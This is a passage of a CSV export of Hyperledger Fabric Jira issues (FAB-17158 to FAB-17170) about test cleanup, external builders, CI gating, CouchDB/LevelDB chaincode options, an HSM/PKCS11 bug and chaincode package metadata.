I noticed these while examining why my tmpfs ran out of space.",,guoger,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015ej:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Nov/19 3:22 PM;guoger;https://github.com/hyperledger/fabric/pull/324 inlines util func (very simple logic and only called at one place in same file);;;","28/Nov/19 6:09 PM;guoger;[~dirist] thank you for being interested in solving this, but a fix has already been submitted and reviewed. there are still lots of `help-wanted` tasks, pls take a look :)

as a general practice, we normally ask before grabbing a task assigned to others.

i'm gonna go ahead and unassign you.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ledger_generate_test leaves garbage behind,FAB-17158,43472,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,sykesm,sykesm,27/Nov/19 4:00 AM,02/Dec/19 10:53 PM,28/Oct/23 3:09 AM,02/Dec/19 10:53 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"There is an integration tests that leaves this test config tree behind:
{code}
reset-rollback053831867
{code}

The stem leads me to believe that the directory is from the reset/rollback test but, no...
the stem used in this code
{code}
func initThreeOrgsSetup() *setup {                                                                                                                                                   
    var err error                                                                                                                                                                    
    testDir, err := ioutil.TempDir("""", ""reset-rollback"")                                                                                                                             
    Expect(err).NotTo(HaveOccurred()
{code}
that is in {{reset_rollback_test.go}} but that is used in tests distributed across multiple files...

Turns out the problem is from {{ledger_generate_test.go}} where the network configuration is created, but never cleaned up. That was, apparently, intentional.
{code}
    AfterEach(func() {                                                                                                                                                               
        setup.terminateAllProcess()                                                                                                                                                  
        setup.network.Cleanup()                                                                                                                                                      
        // do not delete testDir and log it so that we can copy the test data to unit tests for verification purpose                                                                 
        fmt.Printf(""The test dir is %s. Use peers/org2.peer0/filesystem/ledgersData as the sample ledger for kvledger rebuild tests\n"", setup.testDir)                               
    })
{code}

(side comment: we should not be writing to stdout in test but using the GinkgoWriter so we can correlate output with tests instead of just spamming as things run...)

Looking at the test, we see this:
{code}
        Skip(""Uncomment to generate sample ledger in v2.0 with new lifecycle chaincode deployment"")                                                                                  
{code}

I'm sure that means the assumption was that this would never run, right? The test is skipped so can't be run... except it is. The {{Skip}} function is just that - a function. It _must_ be executed for it to take effect. By extension, that means the {{BeforeEach}} and {{AfterEach}} are run. Since {{AfterEach}} isn't cleaning up the tree, it just gets left behind.

Summary: use a build tag.",,guoger,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015er:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Nov/19 5:02 PM;guoger;https://github.com/hyperledger/fabric/pull/325;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Contribution guide in fabric-test README,FAB-17159,43473,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,rameshthoomu,rameshthoomu,27/Nov/19 5:16 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,05/Dec/19 7:30 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Contribution guide is required in fabric-test to explain how to contribute to fabric-test repository.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17172,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfo:i",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a fabric deployer, I want to avoid any docker requirements in my deployment",FAB-17160,43474,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,wlahti,sykesm,sykesm,27/Nov/19 6:06 AM,12/Dec/19 1:20 PM,28/Oct/23 3:09 AM,12/Dec/19 1:20 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"With the introduction of external builders, docker should no longer be necessary.

To ensure that's true and that it remains the case, implement an integration test that explicitly removes any docker configuration from the peer and uses the binary builder in our integration tests to run an end-to-end scenario.",,guoger,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-13584,,,No,,Unset,No,,,"1|i00n2e:8zl6",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,sykesm,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Nov/19 3:12 PM;guoger;when peer starts, we still have Docker setups in place, and we do fall back to Docker build when external builders are not available (or error out?).

do we want to change that behavior to ""if {{vm}} is not specified, disable docker completely""?;;;","10/Dec/19 7:34 AM;wlahti;[https://github.com/hyperledger/fabric/pull/384];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve error msg of multiple OUs,FAB-17161,43478,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,27/Nov/19 12:50 PM,22/May/20 4:57 PM,28/Oct/23 3:09 AM,19/Apr/20 1:22 PM,,,,,,,,,,v1.4.8,v2.0.0,,,fabric-common,,,,,,,,,0,,,,,,"[this error message|https://github.com/hyperledger/fabric/blob/24afa1298889308ba98074495d6e722f248226d0/msp/mspimplvalidate.go#L213] prints out address of structs, which is not useful for human",,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015fn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Nov/19 3:01 PM;guoger;https://github.com/hyperledger/fabric/pull/321;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update system test python wrapper,FAB-17162,43485,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,27/Nov/19 11:48 PM,28/Nov/19 3:17 AM,28/Oct/23 3:09 AM,28/Nov/19 12:02 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Assertion is failing because of the incorrect log file name is providing. With the the recent changes, the networkspec file name was changed but not updated in the system test python wrapper file.

Update System test python wrapper file to include new changes related to networkspec file name",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015gr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Nov/19 12:02 AM;rameshthoomu;https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34472/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add chaincode definition option to enforce execution on either LevelDB or CouchDB,FAB-17163,43488,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,28/Nov/19 3:47 AM,09/Nov/20 11:25 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,1,,,,,,"Chaincode written to work against LevelDB will also work against CouchDB, as the CouchDB state database supports a superset of the chaincode APIs – everything LevelDB state database supports plus JSON query (GetQueryResult API).

There is one caveat - chaincode execution on CouchDB state database performs additional validation as required by CouchDB database itself:

1) Check for reserved fields in the top level of the JSON (FAB-8006): _id, _rev, _deleted, ~version.

2) Ensure keys are valid UTF8, and do not start with underscore, as required by CouchDB.

These restrictions are documented here:
https://hyperledger-fabric.readthedocs.io/en/latest/couchdb_as_state_database.html#state-database-options

One consequence is that chaincode executed and validated against LevelDB may not get validated on CouchDB peers. There may also be scenarios where range query results are sorted differently across LevelDB and CouchDB, causing differences in range query validation. For these reasons it is not advised to run a channel on a mix of LevelDB and CouchDB peers.

This work item would add an optional database specification on the chaincode definition, so that administrators could enforce the intended database target:
- chaincode intended for a key/value data store (such as LevelDB) that produces a writeset should only be endorsed if the transaction was simulated on a peer with key/value data store.
- chaincode intended for a JSON data store (such as CouchDB) that produces a writeset should only be endorsed if the transaction was simulated on a peer with JSON data store.",,baohua,denyeart,manish-sethi,MichaelWang,siddjain,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-10061,FAB-10062,FAB-16355,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0oi",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,denyeart,manish-sethi,MichaelWang,siddjain,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer cant initialize when PKCS11 is enabled,FAB-17164,43492,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Environment Issue,,vieiramanoel,vieiramanoel,29/Nov/19 3:00 AM,19/Jun/20 12:40 AM,28/Oct/23 3:09 AM,29/Nov/19 7:27 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Well I'm trying to integrate my fabric components with HSM, but I can't make a progress due to a possible bug. 
 The error I get is

{{ 

2019-11-28 17:52:13.919 UTC [msp] getSigningIdentityFromConf -> DEBU 038 Could not find SKI [f803f7bdc087dd514045c500bedfc664e447ee3d6deede6fc5a4b6edf47f8c90], trying KeyMaterial field: Key not found. This is a dummy KeyStore}}
Failed getting key for SKI [[248 3 247 189 192 135 221 81 64 69 197 0 190 223 198 100 228 71 238 61 109 238 222 111 197 164 182 237 244 127 140 144]]

}}

That is related to this line: 
[DummyKS GetKey()|https://github.com/hyperledger/fabric/blob/c5d4087dc7230c862630b84319837b8efbd3b4b8/bccsp/sw/dummyks.go#L41]

This dummy ks is instantiated here: 
[DummyKS Instantiation|https://github.com/hyperledger/fabric/blob/d3adcc0e4c06c458bc36db3c4e8cb335e1b01e9e/bccsp/factory/swfactory.go#L38]

So everytime that swOpts.Ephemeral is set to true this error will happen. 
I want peer to use key from HSM not have a private key saved in it's disk. 
I don't know what is needed to make this work.


Useful informations 
commit hash: 1ac3f05847279f87da5daf81415a02b89048c2e9
peer dockerfile.in: https://gist.github.com/vieiramanoel/95afc456e61ddae786176b7932638d1f
peer debug logs: https://hastebin.com/olovikacic.cs
peer core.yaml: https://hastebin.com/edajolefod.php
",,caduellery,vieiramanoel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015hv:",,,,Unset,Unset,,,,Unset,,,,,,Unset,,Unset,,(Please add usage information),caduellery,vieiramanoel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jun/20 12:40 AM;caduellery;Was this bug fixed? We are dealing with the same situation... v-1.4.4;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Integration test flake - kills chaincode containers as unexpected,FAB-17165,43499,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,btl5037,btl5037,02/Dec/19 3:15 AM,04/Dec/19 4:53 AM,28/Oct/23 3:09 AM,04/Dec/19 4:53 AM,,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ci-flake,,,,,"Recently introduced integration test flaking in CI:

[https://github.com/hyperledger/fabric/blame/e939f9ca9993ab6f701f5e8a900e4fbd5dd99e56/integration/e2e/e2e_test.go#L357]

Logs:

[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/2837/logs/60]",,btl5037,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015j7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,caod,denyeart,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Dec/19 11:55 PM;btl5037;[~dereckluo];;;","03/Dec/19 3:18 AM;btl5037;[~caod];;;","03/Dec/19 6:30 AM;caod;may be related to FAB-16862;;;","03/Dec/19 6:40 AM;caod;One really quick fix that would probably make the flake go away would be to just change [https://github.com/hyperledger/fabric/blob/master/integration/nwo/core_template.go#L62] so that it's less than [https://github.com/hyperledger/fabric/blob/master/integration/nwo/network.go#L173]

Because they're both 1 min any test that ends up having to retry pulling from remote peers for whatever reason will always risk hitting the eventually timeout and failing the test once the pullRetryThreshold is hit. The test doesn't fail normally because an eventually timeout of 1min still has a polling interval of 10ms by default which introduces a small jitter and large enough of a gap that the integration test can fail the pull retry after 1 min and still complete the commit readiness check in time. After the pull retry fails it will mark private data as missing and then complete the commit readiness check which often takes less than 5ms to complete, however any slowness on the machine could potentially push this time past the eventually timeout window. If you look at the failed tests the polling interval just happens to hit very close to 60.000s in those runs giving even less time for the above steps to complete fast enough. In the linked logs you can see \{{Timed out after 60.001s}} which only gave 1ms of leeway for the pull retry to finish and complete the commit readiness check.

Ultimately we should still aim to fix FAB-16862 to avoid ending up in a pull retry loop in the first place;;;","04/Dec/19 4:46 AM;denyeart;https://github.com/hyperledger/fabric/pull/348;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add gates for UT, IT and DocBuild",FAB-17166,43500,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,02/Dec/19 4:29 AM,18/Jan/20 12:52 PM,28/Oct/23 3:09 AM,18/Jan/20 12:52 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"We should add a gate for the UT, IT and DocBuild jobs in AZP CI behind the VerifyBuild job. The VerifyBuild job should tell the other jobs which of them should run, i.e., if only a doc changed was pushed, we should trigger doc and not UT and IT. If the change is outside the /docs tree we should trigger all CI",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015jf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
amend GitHub workflow guidance,FAB-17167,43501,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,guoger,guoger,guoger,02/Dec/19 3:02 PM,02/Dec/19 6:14 PM,28/Oct/23 3:09 AM,02/Dec/19 6:14 PM,,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"emphasize on commit message format

refer to github doc again from contributing doc in section related to submitting PR",,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015jn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Dec/19 6:14 PM;guoger;https://github.com/hyperledger/fabric/pull/340;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update the build badge to Azp from Jenkins in fabric readme.md,FAB-17168,43507,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,rameshthoomu,rameshthoomu,03/Dec/19 12:11 AM,18/Jan/20 12:53 PM,28/Oct/23 3:09 AM,18/Jan/20 12:53 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,The README.md shows the build badge of Jenkins job reference but this has to update to AZP.. https://docs.microsoft.com/en-us/azure/devops/pipelines/create-first-pipeline?view=azure-devops&tabs=browser%2Ctfs-2018-2#add-a-status-badge-to-your-repository,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17169,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwyk",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update the build badge to Azp from Jenkins in fabric readme.md,FAB-17169,43508,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,rameshthoomu,rameshthoomu,03/Dec/19 12:12 AM,18/Jan/20 12:52 PM,28/Oct/23 3:09 AM,18/Jan/20 12:52 PM,v1.4.5,,,,,,,,,v1.4.5,,,,fabric-docs,,,,,,,,,0,,,,,,The README.md shows the build badge of Jenkins job reference but this has to update to AZP.. https://docs.microsoft.com/en-us/azure/devops/pipelines/create-first-pipeline?view=azure-devops&tabs=browser%2Ctfs-2018-2#add-a-status-badge-to-your-repository,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17168,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015kr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Package metadata must be carried through to external builder unmodified,FAB-17170,43509,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,sykesm,sykesm,03/Dec/19 12:45 AM,12/Dec/19 12:12 PM,28/Oct/23 3:09 AM,12/Dec/19 12:12 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"I was looking through the code and it appears that the {{PackageMetadata}} structure in {{internal/peer/lifecycle/chaincode/package.go}} is defined as:
{code}
// PackageMetadata holds the path and type for a chaincode package
type PackageMetadata struct {
	Path  string `json:""Path""`
	Type  string `json:""Type""`
	Label string `json:""Label""`
}
{code}

In the {{externalbuilder}} package, we reference the {{ChaincodePackageMetadata}} structure from {{core/chaincode/persistence/chaincode_package.go}}. This is defined as:
{code}
// ChaincodePackageMetadata contains the information necessary to understand
// the embedded code package.
type ChaincodePackageMetadata struct {
	Type  string `json:""type""`
	Path  string `json:""path""`
	Label string `json:""label""`
}
{code}

Since JSON is case sensitive, the case sensitivity may be a problem when using the same external builder implementation for legacy and new lifecycle models.

An additional issue is that extra keys in the metadata will be lost when round-tripping the {{persistence.ChaincodePackageMetadata}} in the external builder {{BuildContext}}.  It is extremely important that we do not modify the metadata file provided in the chaincode package when using the external builder.

